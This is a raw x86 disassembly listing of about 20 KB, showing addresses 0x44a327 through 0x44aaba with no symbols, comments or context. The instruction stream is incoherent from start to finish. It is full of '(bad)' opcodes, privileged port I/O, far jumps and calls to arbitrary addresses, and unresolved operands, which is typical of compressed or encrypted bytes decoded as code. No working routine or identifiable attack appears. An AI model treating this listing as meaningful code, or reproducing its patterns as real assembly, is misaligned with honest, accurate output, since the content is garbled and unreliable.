  44a327:	jbe    0x44a345
  44a329:	stos   DWORD PTR es:[edi],eax
  44a32a:	sbb    DWORD PTR [edx],esp
  44a32c:	inc    ebx
  44a32d:	dec    esp
  44a32e:	dec    eax
  44a32f:	xor    eax,0xe8111c
  44a334:	gs sahf 
  44a336:	push   esp
  44a337:	sub    al,dl
  44a339:	mov    eax,0x97743624
  44a33e:	adc    esp,DWORD PTR [eax]
  44a340:	mov    bl,0x54
  44a342:	imul   ecx,DWORD PTR [eax],0xc165874
  44a348:	dec    eax
  44a349:	mov    dh,0xa1
  44a34b:	dec    edx
  44a34c:	push   ecx
  44a34d:	sub    BYTE PTR [edx+0x7fc0e24b],dl
  44a353:	fidivr DWORD PTR [edx]
  44a355:	xchg   esi,eax
  44a356:	mov    ah,0xc2
  44a358:	push   eax
  44a359:	ss push es
  44a35b:	mov    edx,0x102d905b
  44a360:	mov    ah,0x48
  44a362:	repz test DWORD PTR [edx+eax*4],ebx
  44a366:	and    esp,DWORD PTR [ecx-0x79]
  44a369:	retf   0xf736
  44a36c:	aaa    
  44a36d:	pushf  
  44a36e:	loopne 0x44a33c
  44a370:	call   0x87159427
  44a375:	lds    ebp,FWORD PTR [esp+ebp*4+0x2b]
  44a379:	in     eax,dx
  44a37a:	mov    ch,BYTE PTR [eax+0x45]
  44a37d:	scas   al,BYTE PTR es:[edi]
  44a37e:	outs   dx,DWORD PTR ds:[esi]
  44a37f:	rcr    BYTE PTR [edi-0x61cb1b22],1
  44a385:	js     0x44a38b
  44a387:	pusha  
  44a388:	add    DWORD PTR [edi+ebp*4-0x71fcec0],0x2e
  44a390:	cmp    BYTE PTR [eax-0x78f7fcbd],cl
  44a396:	fiadd  WORD PTR [ecx+0x62362457]
  44a39c:	in     eax,0x5d
  44a39e:	push   cs
  44a39f:	mov    bh,0x2b
  44a3a1:	push   0x3cb23b6d
  44a3a6:	sbb    al,0xbe
  44a3a8:	sub    al,0xe3
  44a3aa:	cmp    ah,ch
  44a3ac:	mov    dl,0x41
  44a3ae:	xchg   BYTE PTR [esi+0x49],cl
  44a3b1:	pop    ds
  44a3b2:	dec    esp
  44a3b3:	aas    
  44a3b4:	retf   0x86c0
  44a3b7:	stos   BYTE PTR es:[edi],al
  44a3b8:	or     BYTE PTR [esi+0x6bc036ac],0x32
  44a3bf:	retf   
  44a3c0:	adc    dh,BYTE PTR [ebp+0x4976835d]
  44a3c6:	sub    ch,dh
  44a3c8:	inc    BYTE PTR [ebx+0x1f]
  44a3cb:	add    eax,0x5b56cebc
  44a3d0:	repnz and eax,0x8028553e
  44a3d6:	arpl   WORD PTR [eax],sp
  44a3d8:	out    dx,al
  44a3d9:	mov    ds:0x5068c2b2,al
  44a3de:	adc    ebp,DWORD PTR [esi]
  44a3e0:	push   cs
  44a3e1:	push   edx
  44a3e2:	xchg   edx,eax
  44a3e3:	xor    al,0x0
  44a3e5:	jne    0x44a3f8
  44a3e7:	sub    al,al
  44a3e9:	mov    dl,0x20
  44a3eb:	add    edx,ebx
  44a3ed:	arpl   WORD PTR [ecx],ax
  44a3ef:	das    
  44a3f0:	dec    eax
  44a3f1:	lock pushf 
  44a3f3:	mov    ebx,ds
  44a3f5:	jbe    0x44a391
  44a3f7:	push   edi
  44a3f8:	push   0xffffff9d
  44a3fa:	ret    0x9681
  44a3fd:	sbb    BYTE PTR [esi+eiz*4],ch
  44a400:	jo     0x44a3d2
  44a402:	fmul   DWORD PTR [esi]
  44a404:	test   DWORD PTR [edi],edx
  44a406:	inc    esi
  44a407:	test   al,0x3d
  44a409:	ret    0x28af
  44a40c:	lea    esp,[ebx]
  44a40e:	js     0x44a432
  44a410:	icebp  
  44a411:	ret    0xd318
  44a414:	sbb    eax,0x9ad5030c
  44a419:	retf   0xcc2a
  44a41c:	iret   
  44a41d:	lods   al,BYTE PTR ds:[esi]
  44a41e:	call   0xb5bbcc91
  44a423:	or     DWORD PTR [ebp+0x1081c056],ebp
  44a429:	inc    BYTE PTR [esi+ecx*4+0x37]
  44a42d:	leave  
  44a42e:	xor    eax,0xb4a2b840
  44a433:	dec    edi
  44a434:	xchg   esp,eax
  44a435:	fld    DWORD PTR [edi+ebx*4]
  44a438:	dec    esp
  44a439:	mov    ds:0x1670b4ac,al
  44a43e:	mov    edi,0xda80f4ea
  44a443:	shr    BYTE PTR [ebp+ebx*4+0x62f5dde0],1
  44a44a:	pop    ebp
  44a44b:	outs   dx,DWORD PTR ds:[esi]
  44a44c:	loopne 0x44a49b
  44a44e:	jge    0x44a3f6
  44a450:	cmp    ah,ch
  44a452:	lock je 0x44a4c1
  44a455:	push   edi
  44a456:	pop    edx
  44a457:	and    esp,esp
  44a459:	xor    bh,BYTE PTR [edx]
  44a45b:	ins    BYTE PTR es:[edi],dx
  44a45c:	cmp    ah,BYTE PTR [eax+0x4a1326b]
  44a462:	push   cs
  44a463:	dec    eax
  44a464:	cmp    BYTE PTR [esi+0x441af004],ah
  44a46a:	add    edi,DWORD PTR [ebp+esi*1-0x3d134268]
  44a471:	icebp  
  44a472:	(bad)  
  44a473:	and    bh,BYTE PTR [ebp+ebx*2-0x58]
  44a477:	add    BYTE PTR [esi+0x29],ah
  44a47a:	dec    cx
  44a47c:	mov    esp,0x78a6b106
  44a481:	rol    BYTE PTR [edx],0x99
  44a484:	je     0x44a411
  44a486:	sub    dl,dl
  44a488:	adc    eax,0x1f5c8870
  44a48d:	mov    dl,0xba
  44a48f:	and    DWORD PTR [edx+eiz*4+0x5a],edi
  44a493:	add    cl,ah
  44a495:	popa   
  44a496:	add    DWORD PTR [edi+edx*1-0x3e],ebp
  44a49a:	cdq    
  44a49b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a49c:	inc    ebp
  44a49d:	enter  0x98ae,0xc4
  44a4a1:	(bad)  
  44a4a2:	sub    dh,dl
  44a4a4:	out    0x7c,eax
  44a4a6:	in     eax,0x38
  44a4a8:	(bad)  
  44a4a9:	rcl    BYTE PTR [ebp-0x4eddc110],cl
  44a4af:	push   0x21
  44a4b1:	test   bl,al
  44a4b3:	sbb    dl,BYTE PTR [edx]
  44a4b5:	ds push eax
  44a4b7:	call   0xbbb214b2
  44a4bc:	xchg   esp,eax
  44a4bd:	aam    0xf1
  44a4bf:	pop    esi
  44a4c0:	mov    esp,0x456d1cbf
  44a4c5:	pop    eax
  44a4c6:	pop    esp
  44a4c7:	mov    ebp,ds
  44a4c9:	inc    edi
  44a4ca:	inc    ecx
  44a4cb:	dec    esp
  44a4cc:	jp     0x44a456
  44a4ce:	mov    eax,ds:0x21e331c0
  44a4d3:	jecxz  0x44a50c
  44a4d5:	sub    ebp,DWORD PTR ss:0x19e314fe
  44a4dc:	test   BYTE PTR [edx+ebp*1+0x3d658e7a],dl
  44a4e3:	sbb    DWORD PTR [edi+0x2741e809],edi
  44a4e9:	and    al,0xa0
  44a4eb:	adc    eax,0x9620b942
  44a4f0:	cs (bad) 
  44a4f2:	pop    esp
  44a4f3:	push   ebx
  44a4f4:	jne    0x44a496
  44a4f6:	adc    eax,0xaeada740
  44a4fb:	mov    dh,0x66
  44a4fd:	mov    edx,0x60150c9e
  44a502:	pop    ecx
  44a503:	push   cs
  44a504:	adc    BYTE PTR [edi],dh
  44a506:	mov    ah,0x35
  44a508:	sbb    BYTE PTR ss:[ecx],ah
  44a50b:	fcmovnbe st,st(6)
  44a50d:	xor    DWORD PTR [ecx+0x5b743440],edx
  44a513:	dec    ebp
  44a514:	mov    BYTE PTR [edi+0x3f28d026],al
  44a51a:	mov    ds:0x442a7d54,al
  44a51f:	(bad)  [ecx]
  44a521:	xor    al,0xce
  44a523:	hlt    
  44a524:	rcl    DWORD PTR [ecx],0x14
  44a527:	cmp    ch,BYTE PTR [ebp+0x2b61da69]
  44a52d:	xor    al,0x36
  44a52f:	jno    0x44a553
  44a531:	xchg   esi,eax
  44a532:	test   al,0xc8
  44a534:	(bad)  
  44a535:	fdiv   st(0),st
  44a537:	add    eax,0xd77e8163
  44a53c:	mov    al,0x6e
  44a53e:	repz ret 0xd002
  44a542:	daa    
  44a543:	mov    ebx,edx
  44a545:	jns    0x44a533
  44a547:	ins    DWORD PTR es:[edi],dx
  44a548:	mov    ebp,0xa60f486
  44a54d:	inc    eax
  44a54e:	je     0x44a4d6
  44a550:	mov    ebp,0xd100cf8
  44a555:	icebp  
  44a556:	loope  0x44a5bc
  44a558:	push   ecx
  44a559:	adc    BYTE PTR [edx-0x576de2ca],dh
  44a55f:	cmp    dl,al
  44a561:	or     ebx,DWORD PTR [edi+0x5f8c8eb6]
  44a567:	nop
  44a568:	nop
  44a569:	push   ebp
  44a56a:	fs xor eax,0x1c2b496f
  44a570:	fiadd  DWORD PTR [edx+0x51c6ee23]
  44a576:	mov    eax,gs:0xfe94fdb5
  44a57c:	jo     0x44a524
  44a57e:	sbb    bl,BYTE PTR [ecx+edx*1]
  44a581:	js     0x44a534
  44a583:	nop
  44a584:	sbb    al,ch
  44a586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a587:	mov    dh,0x33
  44a589:	mov    cl,0xc3
  44a58b:	push   ds
  44a58c:	lock fwait
  44a58e:	cmp    DWORD PTR [esi+eax*1+0x4],esp
  44a592:	(bad)  
  44a593:	aam    0x35
  44a595:	test   al,0x4d
  44a597:	lds    eax,FWORD PTR [edi+0xa]
  44a59a:	lahf   
  44a59b:	pop    es
  44a59c:	sbb    BYTE PTR [eax+0x2f],dh
  44a59f:	imul   esp,DWORD PTR [edi],0xf0a22e8c
  44a5a5:	es fcmovb st,st(0)
  44a5a8:	inc    esi
  44a5a9:	pop    eax
  44a5aa:	repnz loopne 0x44a5dc
  44a5ad:	pop    edi
  44a5ae:	push   es
  44a5af:	push   esi
  44a5b0:	jl     0x44a544
  44a5b2:	in     eax,0x52
  44a5b4:	sub    BYTE PTR [edx+0x20],ah
  44a5b7:	push   ebx
  44a5b8:	clc    
  44a5b9:	inc    eax
  44a5ba:	jne    0x44a614
  44a5bc:	mov    dl,0xea
  44a5be:	shl    dl,1
  44a5c0:	xor    BYTE PTR [eax+0x40a6fb6],0x5d
  44a5c7:	call   0x6dc85cea
  44a5cc:	push   0x763e8897
  44a5d1:	ins    BYTE PTR es:[edi],dx
  44a5d2:	repnz inc ebx
  44a5d4:	dec    edx
  44a5d5:	fs jp  0x44a55e
  44a5d8:	jno    0x44a5db
  44a5da:	imul   eax,ebp,0xffffff91
  44a5dd:	jmp    0xdca1:0x58587e22
  44a5e4:	sbb    al,0xf6
  44a5e6:	inc    edi
  44a5e7:	xchg   edx,eax
  44a5e8:	xchg   ebp,eax
  44a5e9:	inc    edx
  44a5ea:	xchg   esi,eax
  44a5eb:	fs lahf 
  44a5ed:	push   ss
  44a5ee:	sub    dl,BYTE PTR [edx]
  44a5f0:	add    al,0x85
  44a5f2:	pop    ss
  44a5f3:	mov    ss,esi
  44a5f5:	outs   dx,BYTE PTR ds:[esi]
  44a5f6:	push   eax
  44a5f7:	loop   0x44a5e9
  44a5f9:	mov    ah,BYTE PTR [ebx]
  44a5fb:	push   0xffffffa5
  44a5fd:	mov    bl,bl
  44a5ff:	ins    BYTE PTR es:[edi],dx
  44a600:	add    al,0xc9
  44a602:	lods   al,BYTE PTR ds:[esi]
  44a603:	mov    eax,ds:0xc3c689e2
  44a608:	mov    ?,WORD PTR [eax+0x113a22cc]
  44a60e:	cli    
  44a60f:	sub    dl,ch
  44a611:	adc    al,0x9c
  44a613:	mov    al,0x6c
  44a615:	jb     0x44a685
  44a617:	or     DWORD PTR [ebp+0x3c],ecx
  44a61a:	jl     0x44a682
  44a61c:	and    BYTE PTR [eax+0x11026b41],ch
  44a622:	int3   
  44a623:	mov    al,ds:0x129f22ff
  44a628:	adc    al,0x20
  44a62a:	inc    esp
  44a62b:	push   es
  44a62c:	xor    al,0x50
  44a62e:	and    BYTE PTR [edi+esi*4+0x25],dl
  44a632:	xor    al,0x78
  44a634:	lods   al,BYTE PTR ds:[esi]
  44a635:	adc    ebp,ebx
  44a637:	adc    esi,esp
  44a639:	adc    ebp,DWORD PTR [ebp+eax*8+0x724fb0dc]
  44a640:	inc    esi
  44a641:	mov    bl,0xcb
  44a643:	push   ds
  44a644:	inc    edx
  44a645:	xchg   esi,eax
  44a646:	jne    0x44a66a
  44a648:	adc    al,0xd4
  44a64a:	add    DWORD PTR [ecx-0x3527fbed],0x0
  44a651:	mov    esp,?
  44a653:	and    eax,0xb9db44a2
  44a658:	mov    esi,0x40aa6624
  44a65d:	pop    es
  44a65e:	shl    BYTE PTR [esi],1
  44a660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a661:	sahf   
  44a662:	xor    al,0xa9
  44a664:	in     al,0xe8
  44a666:	sbb    ecx,esp
  44a668:	adc    eax,0xa8208284
  44a66d:	xchg   ebx,eax
  44a66e:	and    BYTE PTR [esi],ah
  44a670:	or     DWORD PTR [esi+0x1],edi
  44a673:	(bad)  
  44a674:	sub    al,0xb2
  44a676:	xor    BYTE PTR [edi+0x7c],dl
  44a679:	xchg   esi,eax
  44a67a:	jl     0x44a620
  44a67c:	adc    eax,0xa2ee9657
  44a681:	mov    cs,edi
  44a683:	pop    edx
  44a684:	or     al,0xa
  44a686:	fist   DWORD PTR ds:0x789a4070
  44a68c:	jmp    0xfcdc:0x781367b4
  44a693:	lea    eax,[eax+0x4e]
  44a696:	retf   0x97ba
  44a699:	xor    BYTE PTR [edx+0x5c23c221],cl
  44a69f:	imul   ecx,DWORD PTR [ecx-0x43],0x22
  44a6a3:	test   DWORD PTR [ecx+0x44],ebp
  44a6a6:	nop
  44a6a7:	lock fcmovb st,st(2)
  44a6aa:	(bad)  
  44a6ab:	jo     0x44a711
  44a6ad:	xor    eax,0x4f4c5368
  44a6b2:	add    eax,0x5da1b515
  44a6b7:	stos   BYTE PTR es:[edi],al
  44a6b8:	sub    bh,BYTE PTR [edi+edx*1-0x44]
  44a6bc:	ror    DWORD PTR [eax-0x38],cl
  44a6bf:	pop    ebx
  44a6c0:	sbb    BYTE PTR [ecx],0xd0
  44a6c3:	push   0xaa20f1a0
  44a6c8:	push   ebp
  44a6c9:	mov    ds:0xbea0e2eb,al
  44a6ce:	push   edi
  44a6cf:	and    eax,0xbe2c1778
  44a6d5:	add    BYTE PTR [eax+ebp*2+0x1c202242],bl
  44a6dc:	fs pop ecx
  44a6de:	mov    DWORD PTR [edx],edi
  44a6e0:	inc    edx
  44a6e1:	and    eax,DWORD PTR [ecx]
  44a6e3:	fdivr  DWORD PTR [esi]
  44a6e5:	push   0x4dc41616
  44a6ea:	pop    esp
  44a6eb:	sbb    ah,BYTE PTR [eax]
  44a6ed:	sbb    BYTE PTR [esp+eiz*4],bl
  44a6f0:	pop    esp
  44a6f1:	xchg   esp,eax
  44a6f2:	jo     0x44a747
  44a6f4:	nop
  44a6f5:	js     0x44a67d
  44a6f7:	mov    dh,BYTE PTR [ebp+0xc]
  44a6fa:	or     ch,BYTE PTR [eax+0x2a]
  44a6fd:	rol    BYTE PTR [ecx-0x52],0x3c
  44a701:	xchg   esp,eax
  44a702:	jbe    0x44a756
  44a704:	mov    esi,0x67c040d7
  44a709:	adc    BYTE PTR [edx],bh
  44a70b:	mov    ah,BYTE PTR [edx+0x10]
  44a70e:	fdiv   DWORD PTR [ebp+ebx*2-0x12]
  44a712:	add    al,dl
  44a714:	(bad)  
  44a715:	fwait
  44a716:	aaa    
  44a717:	hlt    
  44a718:	inc    ebx
  44a719:	and    bh,BYTE PTR [esi]
  44a71b:	add    cl,dl
  44a71d:	aad    0x3c
  44a71f:	or     bl,bl
  44a721:	pop    ds
  44a722:	and    al,0x3c
  44a724:	adc    ah,BYTE PTR [esi-0x19]
  44a727:	cmp    ecx,DWORD PTR [eax+0x65]
  44a72a:	lahf   
  44a72b:	icebp  
  44a72c:	dec    edx
  44a72d:	rcr    BYTE PTR [esi],cl
  44a72f:	aaa    
  44a730:	sbb    eax,0x53771821
  44a735:	pop    edx
  44a736:	lea    edi,[edx]
  44a738:	xchg   dh,al
  44a73a:	iret   
  44a73b:	mov    ds:0xd4cbf4b2,al
  44a740:	outs   dx,DWORD PTR ds:[esi]
  44a741:	cld    
  44a742:	jo     0x44a74e
  44a744:	into   
  44a745:	sar    BYTE PTR [ebp-0x7c149a0b],cl
  44a74b:	mov    dh,0xdc
  44a74d:	mov    dh,0xca
  44a74f:	fidivr DWORD PTR [edx+0x2a50b2e6]
  44a755:	adc    DWORD PTR [edx-0x1e],edx
  44a758:	mov    esp,0x36109f34
  44a75d:	outs   dx,DWORD PTR ds:[esi]
  44a75e:	mov    dl,0x9e
  44a760:	mov    esp,0xdedbcf00
  44a765:	jmp    0x6c80:0xa7ec3bf3
  44a76c:	test   BYTE PTR [edi-0x4f3e39d],bl
  44a772:	push   cs
  44a773:	xor    ch,BYTE PTR [edx-0x4237e6a2]
  44a779:	fwait
  44a77a:	jle    0x44a78c
  44a77c:	jp     0x44a720
  44a77e:	sbb    bh,0xaa
  44a781:	push   edi
  44a782:	mov    sp,0xfaa1
  44a786:	ins    BYTE PTR es:[edi],dx
  44a787:	mov    eax,ds:0x34374000
  44a78c:	mov    ch,BYTE PTR [edi+0x107eb7d2]
  44a792:	jb     0x44a7e8
  44a794:	shl    BYTE PTR gs:[edx],0x86
  44a798:	or     BYTE PTR [edx+0xa2e44a],dl
  44a79e:	sub    BYTE PTR [edx-0x2ed5dfbd],al
  44a7a4:	push   ss
  44a7a5:	or     DWORD PTR [ecx-0x272003b5],eax
  44a7ab:	push   eax
  44a7ac:	mov    al,0x63
  44a7ae:	mov    WORD PTR [ebp+0x3118921f],cs
  44a7b4:	jl     0x44a77e
  44a7b6:	inc    esp
  44a7b7:	mov    bl,0xaa
  44a7b9:	or     eax,0xfa3eb2f4
  44a7be:	xor    BYTE PTR [esi-0xf81bf20],0x6c
  44a7c5:	inc    edx
  44a7c6:	dec    ebp
  44a7c7:	jo     0x44a814
  44a7c9:	jp     0x44a7d4
  44a7cb:	cmp    al,0x10
  44a7cd:	xchg   esi,eax
  44a7ce:	fcom   QWORD PTR [ecx]
  44a7d0:	pop    esi
  44a7d1:	push   0xfffffffd
  44a7d3:	add    al,0x2a
  44a7d5:	jle    0x44a761
  44a7d7:	mov    al,BYTE PTR [ebp+0x1e]
  44a7da:	jo     0x44a847
  44a7dc:	fist   DWORD PTR [ebp-0x5123ae0c]
  44a7e2:	mov    dh,0xae
  44a7e4:	(bad)  
  44a7e6:	cmp    esi,esp
  44a7e8:	jp     0x44a84f
  44a7ea:	add    bl,BYTE PTR ds:0x2a9ea0cc
  44a7f0:	xor    al,0x47
  44a7f2:	and    al,0x5e
  44a7f4:	mov    edx,DWORD PTR [edi+esi*2-0x71]
  44a7f8:	dec    esp
  44a7f9:	xor    DWORD PTR [edx+0x28b3460b],esp
  44a7ff:	(bad)  
  44a800:	inc    esi
  44a801:	inc    ecx
  44a802:	out    0x56,al
  44a804:	pop    eax
  44a805:	aam    0xf0
  44a807:	or     eax,0xa11423ee
  44a80c:	sbb    ah,bh
  44a80e:	test   BYTE PTR [ebx],0x85
  44a811:	inc    edi
  44a812:	pop    ecx
  44a813:	outs   dx,BYTE PTR ds:[esi]
  44a814:	jo     0x44a7cc
  44a816:	add    BYTE PTR [ebp+0x28],dl
  44a819:	xor    eax,0xa4d0c0a6
  44a81e:	add    BYTE PTR [edx+0x6b],0xb8
  44a822:	mov    dl,0x8
  44a824:	sbb    dl,BYTE PTR [edi]
  44a826:	pop    esi
  44a827:	sub    DWORD PTR [edx],ecx
  44a829:	or     BYTE PTR [edi],ah
  44a82b:	test   al,0x22
  44a82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a82e:	xchg   edx,eax
  44a82f:	jmp    0x9079:0xdaa4575a
  44a836:	sbb    al,0x7d
  44a838:	(bad)  
  44a839:	out    dx,eax
  44a83a:	call   0x4755d6
  44a83f:	div    esp
  44a841:	outs   dx,DWORD PTR ds:[esi]
  44a842:	repnz mov DWORD PTR [edx-0x60],eax
  44a846:	mov    ecx,0xde00edc2
  44a84b:	fld    QWORD PTR [edi+edx*8-0x4e17b826]
  44a852:	lods   al,BYTE PTR ds:[esi]
  44a853:	loope  0x44a8d3
  44a855:	les    eax,FWORD PTR [ecx-0x54]
  44a858:	xor    al,0xef
  44a85a:	adc    al,0xec
  44a85d:	xor    eax,0x6abd5dd4
  44a862:	pop    esi
  44a863:	ror    DWORD PTR [edx-0xf57eed9],1
  44a869:	mov    edi,0x1dcf23e
  44a86e:	mov    esp,0xdc26b686
  44a873:	dec    ebp
  44a874:	mov    al,0xe6
  44a876:	jns    0x44a8cc
  44a878:	inc    ebx
  44a879:	dec    eax
  44a87a:	in     eax,dx
  44a87b:	mov    bl,0xd2
  44a87d:	cmp    ch,dl
  44a87f:	(bad)  
  44a880:	and    al,0xc8
  44a882:	mov    dl,0x76
  44a884:	cwde   
  44a885:	mov    al,ds:0x36fcb0aa
  44a88a:	test   BYTE PTR ss:0x398a388b,dl
  44a891:	and    al,0x48
  44a893:	jl     0x44a902
  44a895:	push   0x26acc083
  44a89a:	out    0xb1,eax
  44a89c:	and    DWORD PTR [eax-0x4285095b],ebp
  44a8a2:	push   ss
  44a8a3:	sbb    DWORD PTR [eax+0x3],ebx
  44a8a6:	add    dh,BYTE PTR [esi-0x67]
  44a8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a8aa:	enter  0x40f8,0x94
  44a8ae:	mov    ch,0x66
  44a8b0:	loop   0x44a930
  44a8b2:	xchg   esi,eax
  44a8b3:	push   0x9a0cbefb
  44a8b8:	lsl    ebx,WORD PTR [ebx+0x65b2f0c3]
  44a8bf:	and    esp,DWORD PTR [eax+0x56]
  44a8c2:	add    eax,DWORD PTR [edx+eax*4+0x766e7823]
  44a8c9:	mov    cl,0x7d
  44a8cb:	or     BYTE PTR [eax+0x4d9052df],0xe0
  44a8d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a8d3:	out    dx,eax
  44a8d4:	jge    0x44a8d6
  44a8d6:	jp     0x44a918
  44a8d8:	push   esi
  44a8d9:	cwde   
  44a8da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a8db:	stos   BYTE PTR es:[edi],al
  44a8dc:	scas   eax,DWORD PTR es:[edi]
  44a8dd:	(bad)  
  44a8de:	xchg   edx,eax
  44a8df:	rcl    BYTE PTR [esi],1
  44a8e1:	adc    al,0xe4
  44a8e3:	cs or  cl,ch
  44a8e6:	push   edx
  44a8e7:	push   esi
  44a8e8:	fiadd  DWORD PTR [ebp-0x752fea7f]
  44a8ee:	shr    DWORD PTR [edx+0x35],cl
  44a8f1:	fs or  al,0xf6
  44a8f4:	or     eax,0xc1f03b01
  44a8f9:	jg     0x44a95b
  44a8fb:	ret    0x86a6
  44a8fe:	lods   eax,DWORD PTR ds:[esi]
  44a8ff:	mov    ecx,0x8eb26980
  44a904:	pop    es
  44a905:	mov    esi,0x1ae65eac
  44a90a:	mov    ebp,0x16b88502
  44a90f:	fcomp  QWORD PTR [eax-0x37]
  44a912:	sub    al,0xa1
  44a914:	sub    DWORD PTR [edx-0x59dbfb2a],0x4db5a82
  44a91e:	jmp    0x44a8b2
  44a920:	xchg   BYTE PTR [edx+0x2c],dl
  44a923:	retf   0x131a
  44a926:	inc    eax
  44a927:	xchg   BYTE PTR [ebx+0x5b],al
  44a92a:	ins    DWORD PTR es:[edi],dx
  44a92b:	mov    dl,0xdf
  44a92d:	pop    eax
  44a92e:	scas   al,BYTE PTR es:[edi]
  44a92f:	jmp    0x8ac2:0xdbd19e4f
  44a936:	sti    
  44a937:	xor    al,0x81
  44a939:	ja     0x44a9a4
  44a93b:	or     BYTE PTR ds:0xa2c2a36e,0x16
  44a942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a943:	repnz clc 
  44a945:	push   es
  44a946:	and    cl,BYTE PTR [esi+edx*4]
  44a949:	mov    ch,0x5c
  44a94b:	shl    BYTE PTR [edi],1
  44a94d:	cli    
  44a94e:	inc    ax
  44a950:	lods   eax,DWORD PTR ds:[esi]
  44a951:	loopne 0x44a8f8
  44a953:	nop
  44a954:	enter  0x2b00,0x34
  44a958:	iret   
  44a959:	cmc    
  44a95a:	or     al,0xa0
  44a95c:	adc    eax,0x6cac6a4c
  44a961:	mov    dh,0x87
  44a963:	das    
  44a964:	lea    edx,[edi-0x7b]
  44a967:	mov    esp,0x66b814de
  44a96c:	pop    ebx
  44a96d:	les    edx,FWORD PTR [ebx+0x2a]
  44a970:	push   0x1c
  44a972:	ds into 
  44a974:	push   ebp
  44a975:	mov    eax,0x13a8a9b5
  44a97a:	sbb    cl,dl
  44a97c:	adc    al,0xcd
  44a97e:	cmp    BYTE PTR [esi-0x29ef0d5],0x4
  44a985:	push   ss
  44a986:	fcomp  QWORD PTR [edx+0x72]
  44a989:	test   BYTE PTR [edi+0x591eb687],dl
  44a98f:	mov    ah,0xe5
  44a991:	sub    BYTE PTR [eax+eax*4+0x4c],ch
  44a995:	cmp    eax,0x920d8106
  44a99a:	ret    0x8e48
  44a99d:	pop    es
  44a99e:	inc    eax
  44a99f:	js     0x44a9b5
  44a9a1:	dec    eax
  44a9a2:	sub    eax,0x9d72b926
  44a9a7:	mov    eax,ds:0xe537c20f
  44a9ac:	mov    ds:0x6f5a9baa,al
  44a9b1:	pop    eax
  44a9b2:	sbb    esp,DWORD PTR [ecx-0x3e]
  44a9b5:	jne    0x44a9d1
  44a9b7:	outs   dx,BYTE PTR ds:[esi]
  44a9b8:	push   ss
  44a9b9:	or     cl,BYTE PTR [esp+esi*4]
  44a9bc:	ret    0x410a
  44a9bf:	jb     0x44a99d
  44a9c1:	mov    ds:0xf8570d4f,al
  44a9c6:	push   0xcff53cd4
  44a9cb:	sub    al,0xac
  44a9cd:	mov    edx,0x40d6a6c6
  44a9d2:	fistp  QWORD PTR [ecx]
  44a9d4:	xchg   edx,eax
  44a9d5:	fist   DWORD PTR [esi-0x7c9468f1]
  44a9db:	clc    
  44a9dc:	and    al,0x44
  44a9de:	mov    cl,0xbc
  44a9e0:	nop
  44a9e1:	xchg   BYTE PTR [eax-0x79a429f1],al
  44a9e7:	neg    BYTE PTR [edi]
  44a9e9:	mov    bh,0x8a
  44a9eb:	nop
  44a9ec:	cmp    BYTE PTR [eax],0xae
  44a9ef:	sbb    ebx,eax
  44a9f1:	jbe    0x44aa60
  44a9f3:	add    ebx,DWORD PTR [ebx-0x25e6f5ac]
  44a9f9:	sbb    cl,BYTE PTR [ebp+0x26cf85e8]
  44a9ff:	mov    dh,0xc0
  44aa01:	jbe    0x44a994
  44aa03:	in     al,0x24
  44aa05:	gs push 0x22f21035
  44aa0b:	xchg   ebp,eax
  44aa0c:	outs   dx,BYTE PTR ds:[esi]
  44aa0d:	sub    BYTE PTR [eax],bh
  44aa0f:	add    DWORD PTR [ebx-0x7f],ebx
  44aa12:	(bad)  
  44aa13:	pop    edx
  44aa14:	pop    edi
  44aa15:	jo     0x44aa00
  44aa17:	out    dx,al
  44aa18:	test   BYTE PTR [eax-0x7b7c5d4b],dl
  44aa1e:	ins    DWORD PTR es:[edi],dx
  44aa1f:	(bad)  
  44aa21:	daa    
  44aa22:	rcl    BYTE PTR [edi],0x40
  44aa25:	cmp    al,0x46
  44aa27:	jle    0x44aa8e
  44aa29:	mov    dl,0x6b
  44aa2b:	ret    0x21a3
  44aa2e:	sub    al,0x4
  44aa30:	dec    esp
  44aa31:	cmp    esi,DWORD PTR [edx-0x50]
  44aa34:	add    dh,BYTE PTR [esi-0x4d33d952]
  44aa3a:	push   esp
  44aa3b:	stos   BYTE PTR es:[edi],al
  44aa3c:	xchg   DWORD PTR [eax+0x28],eax
  44aa3f:	out    0x68,al
  44aa41:	add    eax,0xc4a93f6
  44aa46:	retf   
  44aa47:	fs xchg esi,eax
  44aa49:	cmp    BYTE PTR [edx],bh
  44aa4b:	scas   al,BYTE PTR es:[edi]
  44aa4c:	push   0x589872e8
  44aa51:	sub    edi,DWORD PTR ds:[edx+0x5c]
  44aa55:	adc    BYTE PTR ds:0x42080a92,al
  44aa5b:	dec    ebp
  44aa5c:	stos   DWORD PTR es:[edi],eax
  44aa5d:	inc    eax
  44aa5e:	inc    eax
  44aa5f:	jge    0x44aad3
  44aa61:	shl    al,cl
  44aa63:	inc    edx
  44aa64:	cmp    al,0x1e
  44aa66:	fs ins BYTE PTR es:[edi],dx
  44aa68:	push   cs
  44aa69:	xor    ah,0xa2
  44aa6c:	fwait
  44aa6d:	cs push esp
  44aa6f:	rol    DWORD PTR [edi+0x5a],1
  44aa72:	mov    edx,DWORD PTR [eax-0x25]
  44aa75:	lods   eax,DWORD PTR ds:[esi]
  44aa76:	adc    dh,BYTE PTR [ecx+0x1e9092d0]
  44aa7c:	adc    al,BYTE PTR [edx+0x6b]
  44aa7f:	add    ah,BYTE PTR [eax]
  44aa81:	not    DWORD PTR [edi]
  44aa83:	mov    DWORD PTR [ebp-0x61],ecx
  44aa86:	je     0x44aac7
  44aa88:	mov    cs,WORD PTR [esi-0x2f2d7d98]
  44aa8e:	addr16 jmp 0x7cdc:0xed7c5f36
  44aa96:	add    dh,BYTE PTR [ecx+0x7a51caeb]
  44aa9c:	fcomp  DWORD PTR [ebx+0x116a820e]
  44aaa2:	push   ebp
  44aaa3:	lahf   
  44aaa4:	and    al,dh
  44aaa6:	jno    0x44aa28
  44aaa8:	(bad)  
  44aaa9:	or     edi,esp
  44aaab:	xchg   edx,eax
  44aaac:	rcr    DWORD PTR [esi+0x54],1
  44aaaf:	xor    ah,BYTE PTR [edi+0x5dd00ca6]
  44aab5:	mov    ds:0x12e2a9a,eax
  44aaba:	in     al,dx
